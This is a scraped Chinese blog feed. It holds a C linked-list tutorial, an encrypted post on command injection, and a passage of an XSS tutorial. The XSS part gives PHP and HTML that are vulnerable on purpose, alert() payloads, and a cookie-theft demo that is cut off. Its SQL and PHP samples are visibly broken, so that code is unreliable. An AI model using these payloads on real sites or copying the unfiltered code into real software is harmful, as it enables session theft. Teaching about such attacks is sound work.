class="comment">//记录顺序表的存储容量</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure></li><li><p>初始化线性表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">InitList</span><span class="params">(SqList&amp; L)</span>&#123;</span><br><span class="line">    <span class="comment">//构造一个空的顺序表，动态申请存储空间</span></span><br><span class="line">    L.elem = (ElemType*)<span class="built_in">malloc</span>(LIST_INIT_SIZE * <span class="keyword">sizeof</span>(ElemType)); </span><br><span class="line">    <span class="comment">//如果申请失败，作出提示并直接退出程序  </span></span><br><span class="line">    <span class="keyword">if</span> (!L.elem) <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">    <span class="comment">//空表的长度初始化为0</span></span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    L.listsize = LIST_INIT_SIZE;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>线性表元素的插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">ListInsert_Sq</span><span class="params">(SqList&amp; L, <span class="type">int</span> i, ElemType e)</span>&#123;</span><br><span class="line">    ElemType* newbase, * p, * q;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L.length + <span class="number">1</span>) </span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">if</span> (L.length &gt;= L.listsize)&#123;</span><br><span class="line">        newbase = (ElemType*)<span class="built_in">realloc</span>(L.elem, </span><br><span class="line">            (L.listsize + LISTINCREMENT) * <span class="keyword">sizeof</span>(ElemType));</span><br><span class="line">        <span class="keyword">if</span> (!newbase) </span><br><span class="line">            <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">        L.elem = newbase;</span><br><span class="line">        L.listsize = L.listsize + LISTINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    q = &amp;(L.elem[i - <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span> (p = &amp;(L.elem[L.length - <span class="number">1</span>]); p &gt;= q; --p) </span><br><span class="line">        *(p + <span class="number">1</span>) = *p;</span><br><span class="line">    *q = e;</span><br><span class="line">    L.length++;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>线性表元素的删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">ListDelete_Sq</span><span class="params">(SqList&amp; L, <span class="type">int</span> i, ElemType&amp; e)</span>&#123;</span><br><span class="line">    ElemType* p, * q;</span><br><span class="line">    <span class="keyword">if</span> ((i &lt; <span class="number">1</span>) || i &gt; L.length)</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    p = &amp;L.elem[i - <span class="number">1</span>];</span><br><span class="line">    e = *p;</span><br><span class="line">    q = L.elem + L.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (++p; p &lt;= q; ++p)</span><br><span class="line">        *(p - <span class="number">1</span>) = *p;</span><br><span class="line">    --L.length;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>线性表元素的输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">printList</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The SqList is:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; L.length; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %d  &quot;</span>, L.elem[i]);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>主函数的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    <span class="type">int</span> n, i, elem, e, a, j;</span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the sqlist:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the sqlist:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;elem);</span><br><span class="line">        ListInsert_Sq(L, i, elem);</span><br><span class="line">    &#125;</span><br><span class="line">    printList(L);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPlease input the position to insert:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the elements:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">    ListInsert_Sq(L, i, e);</span><br><span class="line">    printList(L);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPlease input the length to delete the size of sqlist:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the place to deldte size:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= a; ++j)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">        ListDelete_Sq(L, <span class="number">1</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    printList(L);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h69pb03qfqj30ij09utci.jpg" alt="image.png"></li></ul><h3 id="SqList-完整代码地址"><a href="#SqList-完整代码地址" class="headerlink" title="SqList 完整代码地址"></a><a href="http:\\chalnl.com\code\sqlist.cpp">SqList 完整代码地址</a></h3>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - 命令注入</title>
      <link href="/post/c714e372.html/"/>
      <url>/post/c714e372.html/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="093ae9b8a7f94fff72caf5831329084dc0b761e137fe99f5dac5a964642aec1a">83560e93f78eba3a08c28de6918151d17f2fc06e8da22da73f29aef98c4054f07902e24edc01636d80dffa5466f40723232fb4fed7a7d448663b656d522c199f08b36bda2743c12b4021201a25b63ab94444dc56fc7b74a1ba628e21c7ec03080dded5fbf494add59e28668eef011bef6c588dffd0813a4956c8294939f0531b6231754be2c03e99ca8d109e0005e014d6502e50ba5a01f0eb8c2093db97559690503788d32046db8090729f757402495c00483e58489ee96f1e2e99c92fa0f6f59c6d7fce6bc0025f73c53df7956ed530e0436b68a225508d0fbb0d452ead75</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 加密内容 </tag>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - XSS攻击</title>
      <link href="/post/7937.html/"/>
      <url>/post/7937.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>目标网站上注入JavaScript脚本 - - &gt; 跨站脚本攻击</p></blockquote><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><ul><li><p><strong>XSS 介绍</strong><br>Cross-Site Scripting (<strong>跨站脚本攻击</strong>）简称XSS，是一种代码注入攻击。攻击者通过<strong>在目标网站上注入恶意脚本，使之在用户的浏览器上运行</strong>。利用这些恶意脚本，攻击者可获取用户的敏感信息如Cookie、SessionID等，进而危害数据安全。</p></li><li><p>我们常看到某某被 DDOS 攻击  就是 XXS 发送非常多的请求造成后端功能瘫痪<br>DDOS - - &gt; 操作后端代码及性能<br>XXS - - &gt; JS - - &gt; 发送网络请求</p></li><li><p><strong>XSS 原理</strong><br>XSS攻击指黑客通过特殊的手段往网页中插入了恶意的<strong>JavaScript脚本</strong>，从而在用户浏览网页时，对用户浏览器发起<strong>Cookie资料窃取、会话劫持、钓鱼欺骗</strong>等各攻击。<br>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p></li></ul><p>XSS跨站脚本攻击漏洞也是OWASP Top 10中经常出现的对象，造成XSS漏洞普遍流行的原因如下:</p><ol><li><strong>Web浏览器</strong>本身的设计不安全，<strong>无法判断JS代码是否是恶意</strong>的</li><li>输入与输出的<strong>Web应用程序基本交互防护不够</strong></li><li>程序员++缺乏安全意识++，++缺少对XSS漏洞的认知++</li><li>XSS触发简单,完全防御起来相当困难</li></ol><ul><li>小彩蛋<br>看到黑客的钓鱼网站了 输入密码 <code>&lt;script&gt;alert(&#39;SB Hacker&#39;);&lt;/script&gt;</code> 将 script脚本 嵌入到网页中 恶心对方一下<br>如果被限制长度了别忘了 F12 改一下<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57bd9i1jyj30y8074dgl.jpg" alt="image.png"></li></ul><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型-XSS-（非持久型）"><a href="#反射型-XSS-（非持久型）" class="headerlink" title="反射型 XSS （非持久型）"></a>反射型 XSS （非持久型）</h3><p>反射型跨站脚本(Reflected Cross-site Scripting)也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p><ul><li>假设一个页面把用户输入的参数直接输出到页面上:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span> [<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>.<span class="variable">$input</span>. <span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>用户向param提交的数据会展示到 <code>&lt;h1&gt;</code> 的标签中展示出来，比如提交:<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/test.php?param=Hello xss</span><br></pre></td></tr></table></figure>会得到如下结果：<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57fu8jzldj30m50630tl.jpg" alt="image.png"></li></ul><p>此时查看页面源代码，可以看到：<br><code>&lt;h1&gt;Hello XSS&lt;/h1&gt;</code></p><p>此时如果提交一个JavaScript代码:<br><code>http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt;</code></p><p>会发现， alert(233) 在当亲页面执行了：<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57fxn6p7zj30mb09iab7.jpg" alt="image.png"></p><p>再查看源代码：<br><code>&lt;h1&gt;&lt;script&gt;alert(233)&lt;/script&gt;&lt;/h1&gt;</code></p><p>用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持k型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过短网址缩短或者转换为二维码等形式灵活运用。</p><h3 id="存储-XSS-持久型-多存放于数据库"><a href="#存储-XSS-持久型-多存放于数据库" class="headerlink" title="存储 XSS (持久型 多存放于数据库)"></a>存储 XSS (持久型 多存放于数据库)</h3><p>存储型 XSS 和反射型 XSS 的差别仅在于∶提交的 XSS 代码会存储在服务端〈不管是数据库、内存还是文件系统等)，下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS 。</p><p>为了复现存储型 XSS ，这里我们得用到数据库，本地新建一个名字叫做 XSS 的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是 <code>id . username .message</code></p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57g6p36a7j30ih09ntbf.jpg" alt="image.png"></p><p>id 设为主键，并勾选自动递增，也可以参考下面的 sql语句来设计表: <strong>导入数据库注意编码问题</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> NAMES utf8mb4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span>`message<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">CREATE TABLE &#x27;</span>message`(</span><br><span class="line"> `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line"> <span class="string">&#x27;username’ varchar(255)CHARACTER SET utf8 COLLATE utf8_general_ci NLL DEFAULT NOLL,</span></span><br><span class="line"><span class="string"> &#x27;</span>message’ <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">17</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROw_F</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY__CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p><p>目前数据库方面设计完了，开始着手写 PHP 后端页面，来复现一下存储型 XSS 漏洞:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  <span class="comment">//不报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*数据库信息配置*/</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;localhost&quot;</span> ;<span class="comment">//数据库地址</span></span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;3306&quot;</span>;      <span class="comment">//数据库端口</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&quot;root&quot;</span>;      <span class="comment">//数据库用户名</span></span><br><span class="line"><span class="variable">$pwd</span> = <span class="string">&quot;root&quot;</span>;       <span class="comment">//数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;xss&quot;</span>;     <span class="comment">//数据库名</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>( <span class="variable">$host</span>,<span class="variable">$user</span> , <span class="variable">$pwd</span> , <span class="variable">$dbname</span> , <span class="variable">$port</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--前端用户输入表单--&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;姓名&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;message&quot;</span> placeholder=<span class="string">&quot;请输入您的留言&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*直接将留言插入到数据库中*/</span></span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$message</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$username</span> <span class="keyword">and</span> <span class="variable">$message</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="variable">$sql</span>=<span class="string">&quot;INSERT INTO ‘message&#x27;(&#x27;username&#x27;,&#x27;message&#x27;) VALUES (&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$messag&#125;</span>`)</span></span><br><span class="line"><span class="string">        if (<span class="subst">$conn</span>-&gt;query(<span class="subst">$sql</span>) === TRUE)&#123;</span></span><br><span class="line"><span class="string">            echo&quot;</span>留言成功<span class="string">&quot;. &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">       &#125; else &#123;</span></span><br><span class="line"><span class="string">           echo &quot;</span><span class="built_in">Error</span>: <span class="string">&quot; . <span class="subst">$sql</span> . &quot;</span>&lt;br&gt;<span class="string">&quot; . <span class="subst">$conn</span>-&gt;error;</span></span><br><span class="line"><span class="string">       )</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">    echo&quot;</span>请填写完整信息<span class="string">&quot;.&quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /*查询数据库中的留言信息*/</span></span><br><span class="line"><span class="string">    <span class="subst">$sql</span> = &quot;</span>SELECT username,message FROM message<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    <span class="subst">$result</span> = <span class="subst">$conn</span>-&gt;query(<span class="subst">$sql</span>);</span></span><br><span class="line"><span class="string">    if (<span class="subst">$result</span>-&gt;num_rows &gt; 0)&#123;</span></span><br><span class="line"><span class="string">       while(<span class="subst">$row</span> = <span class="subst">$result</span>-&gt;fetch_assoc()) &#123;</span></span><br><span class="line"><span class="string">          echo &quot;</span>用户名: <span class="string">&quot; .<span class="subst">$row</span>[ &quot;</span>username<span class="string">&quot;].&quot;</span>留言内容:<span class="string">&quot; . <span class="subst">$row</span> [ &quot;</span>message<span class="string">&quot; ] . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">    &#125;else &#123;</span></span><br><span class="line"><span class="string">    echo&quot;</span>暂无留言<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure></p><p>将以上代码保存为 php文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面:</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57gw37z3mj30ez07pwgx.jpg" alt="image.png"></p><p>留言将会存到数据库当中</p><p>可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了html网页中，这样就很容易导致存储型xsS 漏洞的产生。<br>当攻击者直接在留言板块插入<code>&lt;script&gt;alert(&#39;鸡你太美&#39;)&lt;/script&gt;</code>，会<strong>导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗</strong>，<strong>除非从数据库中删除这条语句</strong>:</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57ja1f5psj30ll0dx774.jpg" alt="image.png"></p><p>此时查看下网页源码:</p><p><code>&lt;b&gt;用户名:&lt;/b&gt;XXX――&lt;b&gt;留言内容:&lt;/b&gt;&lt;script&gt;alert( &#39;鸡你太美&#39;)&lt;/script&gt;&lt;br&gt;</code></p><p>存储型 XSS 的攻击是<strong>最隐蔽的也是危害比较大</strong>的，普通用户所看的URL为 <code>http://127.0.0.1/test.php</code> ,从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p><h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul><li><strong>DOM型不需要后端参与</strong></li></ul><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并<strong>不需要服务器解析响应的直接参与</strong>，触发XSS靠的就是浏览器端的DOM解析，可以认为<strong>完全是客户端</strong>的事情。</p><p>下面编写一个简单的含有DOM XSS漏洞的HTML代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;&quot;</span><span class="attr">UTF-8</span>&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">xss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;src&quot;</span> ).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;demo&quot;</span> ) .<span class="property">innerHTML</span> = <span class="string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; /&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&lt;/ script&gt;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;src&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入图片地址&quot;</span>/&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;插入&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xss()&quot;</span> /&gt;</span></span>&lt;br&gt;</span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>将输入的图片插入到 src 中生成<br>页面会通过 <img> 标签将插入的图片显示在网页中</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57u55z7c8j30fm091dh5.jpg" alt="image.png"></p><p>同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候:</p><p><code>1&#39;onerror=alert(233)//</code></p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57u7luirsj30lt0l0af4.jpg" alt="image.png"></p><p>会直接在 <img> 标签中插入 onerror事件，该语句表示当图片加载出错的时候，自动触发后面的alert)函数，来达到弹窗的效果，这就是一个最简单的DOM型XSS漏洞。</p><ul><li><strong>漏洞出现的地方</strong><br>购物车 地址信息，网站配置文件，用户资料，论坛帖子发布，蚂蚁森林留言。<br>导致窃取cookie</li></ul><h2 id="XSS-平台"><a href="#XSS-平台" class="headerlink" title="XSS 平台"></a>XSS 平台</h2><ol><li>蓝莲花开源的 XSS<br><strong>本工具仅允许使用在CTF比赛等学习、研究场景，严禁用于非法用途</strong></li></ol><h3 id="黑进网站示例"><a href="#黑进网站示例" class="headerlink" title="黑进网站示例"></a>黑进网站示例</h3><p> ++在这演示使用上述开源平台找到 cookie 通过 XSS 